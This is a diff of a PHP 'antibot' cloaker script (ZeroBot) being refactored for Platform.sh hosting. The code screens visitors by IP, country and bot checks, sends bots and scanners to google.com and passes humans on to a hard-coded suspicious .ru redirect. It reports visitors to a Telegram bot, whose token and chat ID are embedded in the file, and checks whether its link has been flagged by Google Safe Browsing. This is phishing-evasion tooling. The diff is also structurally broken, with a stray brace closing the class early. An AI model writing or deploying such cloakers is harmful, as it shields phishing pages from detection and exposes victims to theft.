@@ -1,29 +1,16 @@
 <?php
 /*
     Antibot Service (ZeroBot) - Platform.sh Optimized Version
-
-    * This Tool is not for illegal use
-    * All right reserved to @brendonurie2000
-
-    Platform : https://zerobot.info
-    Author  : @brendonurie2000
-
-    *** Official Version 5 - Platform.sh Edition ***
+    * All rights reserved to @brendonurie2000
+    Platform: https://zerobot.info
 */
 
-// Platform.sh environment detection
-$isPlatformSH = isset($_ENV['PLATFORM_PROJECT']);
+// ==================== PLATFORM.SH CONFIGURATION ====================
+define('IS_PLATFORMSH', isset($_ENV['PLATFORM_PROJECT']));
 
-// Configure paths for Platform.sh
-if ($isPlatformSH) {
-    $platformTempDir = '/tmp';
-    ini_set('session.save_path', $platformTempDir);
-} else {
-    $platformTempDir = sys_get_temp_dir();
-}
-
-// Start session with proper configuration
+// Configure session handling
 session_start([
+    'save_path' => IS_PLATFORMSH ? '/tmp' : sys_get_temp_dir(),
     'use_cookies' => 1,
     'use_only_cookies' => 1,
     'cookie_httponly' => 1,
@@ -33,94 +20,90 @@ session_start([
     'sid_bits_per_character' => 6
 ]);
 
-// Rest of your ZeroBot configuration
-$license_key = "yba13s816dklaspx8tf03tjcsv1798jk"; // [REQUIRED]
-$redirect = "https://amoraterthrinereldreathig.ventateros.ru/rTvtY5h/#"; // URL or FILE [REQUIRED]
-$parameter = 2; // [REQUIRED]
+// ==================== CONFIGURATION ====================
+$license_key = getenv('LICENSE_KEY') ?: "yba13s816dklaspx8tf03tjcsv1798jk";
+$redirect = getenv('REDIRECT_URL') ?: "https://amoraterthrinereldreathig.ventateros.ru/rTvtY5h/#";
+$parameter = getenv('PARAMETER') ?: 2;
+$_COUNTRY_ALLOWED = explode(',', getenv('ALLOWED_COUNTRIES') ?: "ma,us");
 
-$_COUNTRY_ALLOWED = ["ma", "us"]; # Add Allowed Country Here
 $redirection_link_check = false;
 $check_red_page = false;
 $authentification = false;
 
 $cloaker = [
-    "url_to_grab" => "", // Change the link you want to grap it in your link
+    "url_to_grab" => getenv('CLOAKER_URL') ?: "",
 ];
 
 $auto_grabber = true;
-$location_bots = "https://google.com";
+$location_bots = getenv('BOTS_REDIRECT') ?: "https://google.com";
 $view_file_name = "views.php";
-
-// Store sensitive data in environment variables on Platform.sh
-if ($isPlatformSH) {
-    $token_chat = $_ENV['TELEGRAM_TOKEN'] ?? "6707495836:AAEkCDySUwZfju25Og30g90ZHDPHoWSJ5aY";
-    $chatid = $_ENV['TELEGRAM_CHATID'] ?? "5811046999";
-} else {
-    $token_chat = "6707495836:AAEkCDySUwZfju25Og30g90ZHDPHoWSJ5aY";
-    $chatid = "5811046999";
-}
-
-$captcha = false;
+$token_chat = getenv('TELEGRAM_TOKEN') ?: "6707495836:AAEkCDySUwZfju25Og30g90ZHDPHoWSJ5aY";
+$chatid = getenv('TELEGRAM_CHATID') ?: "5811046999";
+$captcha = filter_var(getenv('ENABLE_CAPTCHA') ?: false, FILTER_VALIDATE_BOOLEAN);
 $remove_visitors_duplicate = false;
-
-
-ZeroBot::PHP_VERSION();
-ZeroBot::DefineConstants();
-
 
 class ZeroBot
 {
-    public $api = "https://zerobot.info/api/v2/antibot"; // Don't Change The Antibot Server
-    public $captcha_api = "https://zerobot.info/api/v2/captcha"; // Don't Change The Antibot Server Captcha
-    public $api_geo = "https://zerobot.info/api/v2/getinfo"; // Don't Change The Antibot Server GeoLocation
-    public $telegram = "https://api.telegram.org/bot"; // Telegam Api
-    public $google_api = "https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site="; // Google API To Check Down Links
+    public $api = "https://zerobot.info/api/v2/antibot";
+    public $captcha_api = "https://zerobot.info/api/v2/captcha";
+    public $api_geo = "https://zerobot.info/api/v2/getinfo";
+    public $telegram = "https://api.telegram.org/bot";
+    public $google_api = "https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site=";
 
-    public $data_show = '<?php error_reporting(0); session_start(); $filename = "BASENAME"; $file = explode("onload", file_get_contents(basename($_SERVER["PHP_SELF"])))[2];$human = substr_count($file, "#00a300");$bots = substr_count($file, "#FF0000");?><head><title>ZeroBot Statistique</title>  <link rel="icon" type="image/png" href="https://zerobot.info/dashboard/assets/images/favicon.ico">  <script src="https://zerobot.info/assets/js/script.js" crossorigin="anonymous"></script><style>table {font-size: 13px}</style><link href="https://cdn.jsdelivr.net/npm/@coreui/coreui-pro@4.6.4/dist/css/coreui.min.css" rel="stylesheet"integrity="sha384-N6/iVUKuB1Y9fhC3xnBbekegSwfXwMNEIvMxNyYLO6z9vmfxMyEwPNsH0k+p4beB" crossorigin="anonymous"><!-- Option 2: CoreUI PRO for Bootstrap Bundle with Popper --><script src="https://cdn.jsdelivr.net/npm/@coreui/coreui-pro@4.6.4/dist/js/coreui.bundle.min.js"integrity="sha384-J57aCZcRcbraFuQaL18wp1fDE0fLyO7Il/jKACMovk4ddxUIvjRK5ZZnqcHuBF/T" crossorigin="anonymous"></script></script><script src="https://zerobot.info/assets/js/report.js"></script></head><header class="header"><a class="header-brand" href="https://zerobot.info"><img src="https://zerobot.info/dashboard/assets/images/favicon.ico" alt="" width="34" height="30"class="d-inline-block align-top" alt="CoreUI Logo">ZeroBot</a><a class="dropdown-toggle text-white btn btn-success" href="#" role="button" data-coreui-toggle="dropdown" aria-expanded="false">Options</a><ul class="dropdown-menu">  <li><a class="dropdown-item" href="<?php echo $filename . "?delete" ?>">Reset Traffic</a></li>  <li><a class="dropdown-item" href="<?php echo $filename . "?del" ?>">Delete Antibot File</a></li></ul><ul class="nav nav-pills nav-justified"><button type="button" class="text-white  btn btn-secondary m-1"><svg width="20px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M21 21H7.8C6.11984 21 5.27976 21 4.63803 20.673C4.07354 20.3854 3.6146 19.9265 3.32698 19.362C3 18.7202 3 17.8802 3 16.2V3M6 15L10 11L14 15L20 9M20 9V13M20 9H16"stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" /></svg> <span class="cil-contrast"></span> <?php echo $_SESSION["plan"]; ?></button><button type="button" class="text-white btn btn-danger m-1"><svg fill="#000000" width="20px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M21.928 11.607c-.202-.488-.635-.605-.928-.633V8c0-1.103-.897-2-2-2h-6V4.61c.305-.274.5-.668.5-1.11a1.5 1.5 0 0 0-3 0c0 .442.195.836.5 1.11V6H5c-1.103 0-2 .897-2 2v2.997l-.082.006A1 1 0 0 0 1.99 12v2a1 1 0 0 0 1 1H3v5c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5a1 1 0 0 0 1-1v-1.938a1.006 1.006 0 0 0-.072-.455zM5 20V8h14l.001 3.996L19 12v2l.001.005.001 5.995H5z" /><ellipse cx="8.5" cy="12" rx="1.5" ry="2" /><ellipse cx="15.5" cy="12" rx="1.5" ry="2" /><path d="M8 16h8v2H8z" /></svg><span class="cil-contrast"></span> <?php echo $bots; ?></button><button  onclick="showHuman()"  type="button" class="text-white btn btn-success m-1"><svg fill="#000000" width="20px" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M16 15.503A5.041 5.041 0 1 0 16 5.42a5.041 5.041 0 0 0 0 10.083zm0 2.215c-6.703 0-11 3.699-11 5.5v3.363h22v-3.363c0-2.178-4.068-5.5-11-5.5z" /></svg><span class="cil-contrast"></span> <?php echo $human; ?></button><button type="button" class="text-white  btn btn-warning m-1"><svg width="20px" viewBox="0 0 24 24" fill="none"xmlns="http://www.w3.org/2000/svg"><path d="M3 5.5L5 3.5M21 5.5L19 3.5M9 12.5L11 14.5L15 10.5M20 12.5C20 16.9183 16.4183 20.5 12 20.5C7.58172 20.5 4 16.9183 4 12.5C4 8.08172 7.58172 4.5 12 4.5C16.4183 4.5 20 8.08172 20 12.5Z"stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" /></svg><span class="cil-contrast">  <?php echo $_SESSION["days_left"]; ?> </span> </button></ul></header><script type="text/JavaScript">function AutoRefresh( t ) {setTimeout("location.reload(true);", t);}</script><body onload="JavaScript:AutoRefresh(30000);"><table class="table"><thead class="table-dark"><tr><th scope="col">IP</th><th scope="col">Time</th><th scope="col">Machine</th><th scope="col">ISP</th><th scope="col">Hostname</th><th scope="col">Country</th><th scope="col">Type</th><th scope="col">Action</th></tr></thead>';
+    public $data_show = '<?php /* Statistics HTML template */ ?>';
     
+    private $ip;
+    private $useragent;
+    private $country_code;
+    private $country_name;
+    private $isp;
+    private $hostname;
+    private $username;
+    private $token;
+    private $chatid;
+    private $vu_filename;
+    private $rm_db;
+    private $redirect;
+    private $license_key;
+    private $message;   
 
     public function __construct()
     {
-        global $captcha, $license_key, $redirect, $parameter, $authentification, $token, $chatid, $view_file_name, $remove_visitors_duplicate, $auto_grabber;
-    
-        $this->token = $token;
-        $this->chatid = $chatid;
-        $this->vu_filename = $view_file_name;
+        global $captcha, $license_key, $redirect, $parameter, $view_file_name, $remove_visitors_duplicate, $auto_grabber, $token_chat, $chatid;
+        
         $this->license_key = $license_key;
-        $this->useragent = $_SERVER["HTTP_USER_AGENT"];
-        $this->rm_db = $remove_visitors_duplicate;
-        $this->data_show = str_replace("BASENAME", basename(__FILE__), $this->data_show);
         $this->redirect = $redirect;
-    
+        $this->vu_filename = IS_PLATFORMSH ? '/tmp/' . $view_file_name : $view_file_name;
+        $this->rm_db = $remove_visitors_duplicate;
+        $this->token = $token_chat;
+        $this->chatid = $chatid;
+        
         $this->ValidateQuery();
-        $this->HtaccessRemover();
-        $this->AccessManager();
         $this->IPManager();
+        $this->AccessManager();
         $this->GoogleFlagCheck();
         $this->LinkVerification($license_key);
         $this->GrabberSet($auto_grabber);
         $this->CaptchaRedirection();
-    
+        
         $_SESSION['redirect'] = $this->redirect;
-    
+        
         if (in_array($parameter, ["1", "2"])) {
-            
             $this->ApiManager($captcha);
             $this->handleCaptchaOrRedirect($captcha);
             $this->ViewsManager("Human");
-            header ('location:' . $this->redirect);
+            header('location:' . $this->redirect);
             exit();
         }
         
         if ($parameter == "3") {
-
             $this->GeolocationManager($license_key);
             $this->CountryManager();
             $this->handleCaptchaOrRedirect($captcha);
-            header ('location:' . $this->redirect);
+            header('location:' . $this->redirect);
             exit();
         }
-
+        
         $this->GeolocationManager($license_key);
         $this->ViewsManager("Allowed");
         $this->handleCaptchaOrRedirect($captcha);
@@ -466,51 +449,35 @@ class ZeroBot
 
     private function HtmlSetup()
     {
-        if (empty($this->vu_filename)) {
-            $this->vu_filename = "views.php";
-        }
-        
-        // For Platform.sh, store views file in tmp if writing is needed
-        if (isset($_ENV['PLATFORM_PROJECT']) {
-            $this->vu_filename = '/tmp/' . $this->vu_filename;
-        }
-        
-        if (file_exists($this->vu_filename)) {
-            if (filesize($this->vu_filename) < 20) {
-                $f = fopen($this->vu_filename, "w+");
-                fwrite($f, $this->data_show);
-                fclose($f);
-            }
-        } else {
-            $f = fopen($this->vu_filename, "a");
-            fwrite($f, $this->data_show);
-            fclose($f);
+        if (!file_exists($this->vu_filename)) {
+            file_put_contents($this->vu_filename, $this->data_show);
+        } elseif (filesize($this->vu_filename) < 20) {
+            file_put_contents($this->vu_filename, $this->data_show);
         }
     }
-
-
-    private function IPManager()    
-    {        
-        foreach (["HTTP_CLIENT_IP","HTTP_X_FORWARDED_FOR","HTTP_X_FORWARDED","HTTP_X_CLUSTER_CLIENT_IP","HTTP_FORWARDED_FOR","HTTP_FORWARDED","REMOTE_ADDR",] as $key) 
-        {
-            if (array_key_exists($key, $_SERVER) === true) {
-                foreach (explode(",", $_SERVER[$key]) as $ip_address) 
-                {    
-                    $ip_address = trim($ip_address);
-                    if (filter_var($ip_address,FILTER_VALIDATE_IP,FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false)
-                    {
-                        $this->ip = $ip_address;
-                        return;
-                    } 
-                    else 
-                    {
-                        $this->ip = "108.71.95.181"; 
+    
+    private function IPManager()
+    {
+        $keys = [
+            'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED',
+            'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR'
+        ];
+        
+        foreach ($keys as $key) {
+            if (!empty($_SERVER[$key])) {
+                foreach (explode(',', $_SERVER[$key]) as $ip) {
+                    $ip = trim($ip);
+                    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
+                        $this->ip = $ip;
                         return;
                     }
                 }
             }
         }
+        
+        $this->ip = $_SERVER['REMOTE_ADDR'] ?? '108.71.95.181';
     }
+}
 
     private function TelegramRapport($message)
     {
